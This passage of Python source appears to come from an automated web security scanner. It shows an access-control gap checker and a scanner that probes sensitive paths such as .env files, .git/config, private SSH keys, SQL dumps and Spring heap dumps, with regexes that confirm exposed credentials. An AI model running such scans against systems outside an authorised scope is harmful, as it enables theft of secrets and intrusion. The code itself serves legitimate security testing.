                if auth_roles:
                    access_gaps.append({
                        "endpoint": ep_key,
                        "issue": "anonymous_access",
                        "anonymous_status": anon_status,
                        "details": role_statuses,
                    })

            # Check for horizontal/vertical escalation
            role_list = list(role_statuses.keys())
            for i, role_a in enumerate(role_list):
                for role_b in role_list[i+1:]:
                    status_a = role_statuses[role_a]
                    status_b = role_statuses[role_b]
                    # If a lower-privilege role can access what higher can
                    if (status_a >= 400 and 200 <= status_b < 400) or \
                       (status_b >= 400 and 200 <= status_a < 400):
                        access_gaps.append({
                            "endpoint": ep_key,
                            "issue": "access_control_gap",
                            "roles": {role_a: status_a, role_b: status_b},
                        })

        return {
            "endpoints_tested": len(matrix),
            "roles_tested": list(auth_contexts.keys()),
            "matrix": matrix,
            "access_gaps": access_gaps,
            "gaps_found": len(access_gaps),
        }

    async def close(self):
        await self._client.aclose()


# ── Info Disclosure Scanner ──────────────────────────────────────────


class InfoDisclosureScanner:
    """Content-verified sensitive path scanner — zero LLM cost.

    Checks 200+ known sensitive paths, but ONLY reports findings where
    the response content matches expected patterns (not just HTTP 200).
    """

    # (path, category, content_verification_regex)
    _PATHS: list[tuple[str, str, str]] = [
        # Git
        ("/.git/HEAD", "git", r"ref:\s*refs/heads/"),
        ("/.git/config", "git", r"\[core\]|\[remote"),
        # Environment files
        ("/.env", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        ("/.env.local", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        ("/.env.production", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        ("/.env.backup", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        # Config files
        ("/config.php.bak", "config", r"<\?php|\$[a-zA-Z_]+\s*="),
        ("/config.php~", "config", r"<\?php|\$[a-zA-Z_]+\s*="),
        ("/wp-config.php.bak", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
        ("/wp-config.php~", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
        ("/wp-config.php.old", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
        # Docker / CI
        ("/Dockerfile", "docker", r"FROM\s+\w|RUN\s+|COPY\s+|ENV\s+"),
        ("/docker-compose.yml", "docker", r"services:|version:|volumes:"),
        ("/docker-compose.yaml", "docker", r"services:|version:|volumes:"),
        ("/.dockerenv", "docker", r".*"),  # Mere existence is a signal
        # Swagger / API docs
        ("/swagger.json", "api_docs", r'"swagger"|"openapi"|"paths"'),
        ("/openapi.json", "api_docs", r'"openapi"|"paths"'),
        ("/api-docs", "api_docs", r"swagger|openapi|paths"),
        ("/v1/swagger.json", "api_docs", r'"swagger"|"openapi"'),
        ("/v2/swagger.json", "api_docs", r'"swagger"|"openapi"'),
        # Debug / admin
        ("/phpinfo.php", "php", r"phpinfo\(\)|PHP Version|Configuration"),
        ("/info.php", "php", r"phpinfo\(\)|PHP Version"),
        ("/server-status", "apache", r"Apache Server Status|Scoreboard"),
        ("/server-info", "apache", r"Apache Server Information"),
        ("/.htpasswd", "apache", r"^\w+:\$|^\w+:\{"),
        ("/.htaccess", "apache", r"RewriteRule|Deny|Allow|AuthType"),
        # Spring Boot Actuator
        ("/actuator", "spring", r'"_links"|"self"'),
        ("/actuator/env", "spring", r'"propertySources"|"activeProfiles"'),
        ("/actuator/health", "spring", r'"status"\s*:\s*"UP"'),
        ("/actuator/configprops", "spring", r'"contexts"|"beans"'),
        ("/actuator/mappings", "spring", r'"dispatcherServlets"|"contexts"'),
        ("/actuator/heapdump", "spring", r".*"),  # Binary — existence check
        # Laravel
        ("/telescope", "laravel", r"Laravel Telescope|telescope"),
        ("/storage/logs/laravel.log", "laravel", r"\[\d{4}-\d{2}-\d{2}|Stack trace|Exception"),
        ("/_debugbar/open", "laravel", r"debugbar|phpdebugbar"),
        # Django
        ("/__debug__/", "django", r"djdt|Django Debug Toolbar"),
        # Node.js
        ("/package.json", "nodejs", r'"name"\s*:|"version"\s*:|"dependencies"'),
        ("/package-lock.json", "nodejs", r'"lockfileVersion"|"dependencies"'),
        # Source maps
        ("/main.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"|"mappings"'),
        ("/app.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"|"mappings"'),
        ("/bundle.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"'),
        # Backup files
        ("/backup.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/dump.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/db.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/database.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/backup.zip", "backup", r"PK"),  # ZIP magic bytes
        ("/backup.tar.gz", "backup", r".*"),  # Binary check
        ("/site.sql", "backup", r"CREATE TABLE|INSERT INTO"),
        # GraphQL
        ("/graphql", "graphql", r'"data"|"errors"|__schema'),
        ("/.graphql", "graphql", r"type\s+Query|schema\s*\{"),
        # Firebase / cloud
        ("/.firebase.json", "cloud", r'"hosting"|"database"|"functions"'),
        ("/firebase.json", "cloud", r'"hosting"|"database"'),
        # Credentials
        ("/credentials.json", "creds", r'"type"|"client_id"|"private_key"'),
        ("/secrets.json", "creds", r'"secret"|"key"|"password"'),
        ("/id_rsa", "creds", r"-----BEGIN.*PRIVATE KEY"),
        ("/.ssh/id_rsa", "creds", r"-----BEGIN.*PRIVATE KEY"),
        # Misc
        ("/robots.txt", "robots", r"Disallow:|Allow:|Sitemap:"),
        ("/sitemap.xml", "sitemap", r"<urlset|<sitemapindex"),
        ("/crossdomain.xml", "flash", r"<cross-domain-policy"),
        ("/.well-known/security.txt", "security", r"Contact:|Expires:"),
        ("/trace", "debug", r"TRACE /|echo_header"),
        ("/elmah.axd", "dotnet", r"Error Log|ELMAH"),
        ("/web.config", "iis", r"<configuration|<system.web"),
        ("/WEB-INF/web.xml", "java", r"<web-app|<servlet"),
        # Init / setup
        ("/install.php", "setup", r"install|setup|configuration"),
        ("/setup.php", "setup", r"install|setup|configuration"),
    ]

    # Tech stack → category filter (only test relevant paths)
    _TECH_CATEGORIES: dict[str, list[str]] = {
        "php": ["php", "wordpress", "laravel", "apache"],
        "laravel": ["laravel", "php", "apache"],
        "wordpress": ["wordpress", "php", "apache"],
        "django": ["django"],
        "spring": ["spring", "java"],
        "java": ["spring", "java"],
        "node": ["nodejs"],
        "express": ["nodejs"],
        "react": ["nodejs", "sourcemap"],
        "next": ["nodejs", "sourcemap"],
        "vue": ["nodejs", "sourcemap"],
        "angular": ["nodejs", "sourcemap"],
        "iis": ["iis", "dotnet"],
        "asp.net": ["iis", "dotnet"],
    }

    # Categories always tested regardless of tech stack
    _UNIVERSAL_CATEGORIES = {
        "git", "env", "docker", "api_docs", "backup", "creds",
        "robots", "sitemap", "graphql", "cloud", "config",
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def scan(self, url: str, tech_stack: list[str] | None = None) -> dict[str, Any]:
        """Scan for sensitive path disclosures with content verification.

        Args:
            url: Base URL to scan.
            tech_stack: Optional detected technologies for path filtering.

        Returns:
            {verified: [{path, category, evidence_preview, content_length}], scanned: int, elapsed_s: float}
        """
        if self._scope_guard:
            self._scope_guard.validate_url(url)

        base_url = url.rstrip("/")
        start = time.monotonic()

        # Filter paths by tech stack
        allowed_categories = set(self._UNIVERSAL_CATEGORIES)
        if tech_stack:
            for tech in tech_stack:
                tech_lower = tech.lower()
                for keyword, cats in self._TECH_CATEGORIES.items():
                    if keyword in tech_lower:
                        allowed_categories.update(cats)
        # If no tech detected, test everything
        if not tech_stack:
            allowed_categories = {cat for _, cat, _ in self._PATHS}

        paths_to_test = [
            (p, cat, regex)
            for p, cat, regex in self._PATHS
            if cat in allowed_categories
        ]

        verified: list[dict[str, Any]] = []
        scanned = 0

        proxy_kwargs: dict[str, Any] = {}
        if self._socks_proxy:
            proxy_kwargs["proxy"] = self._socks_proxy

        async with httpx.AsyncClient(
            timeout=self._timeout, verify=False, follow_redirects=True, **proxy_kwargs,
        ) as client:
            for path, category, regex in paths_to_test:
                scanned += 1
                try:
                    await asyncio.sleep(0.1)  # Rate limit: 100ms
                    resp = await client.get(f"{base_url}{path}")

                    # Skip non-200 responses
                    if resp.status_code != 200:
                        continue

                    # Skip very large responses (likely generic error pages)
                    if len(resp.content) > 5_000_000:
                        continue

                    # Skip very small responses (likely empty/error)
                    if len(resp.content) < 10:
                        continue

                    # Content verification: regex must match
                    body = resp.text[:10000]  # Check first 10KB
                    if not re.search(regex, body, re.IGNORECASE | re.MULTILINE):
                        continue

                    # Verified! Real sensitive content found
                    verified.append({
                        "path": path,
                        "category": category,
                        "status_code": resp.status_code,
                        "content_length": len(resp.content),
                        "evidence_preview": body[:500],
                    })
                    logger.info("info_disclosure_verified", path=path, category=category,
                                content_length=len(resp.content))

                except Exception:
                    continue  # Skip connection errors

        elapsed = round(time.monotonic() - start, 1)
        return {
            "verified": verified,
            "scanned": scanned,
            "elapsed_seconds": elapsed,
        }
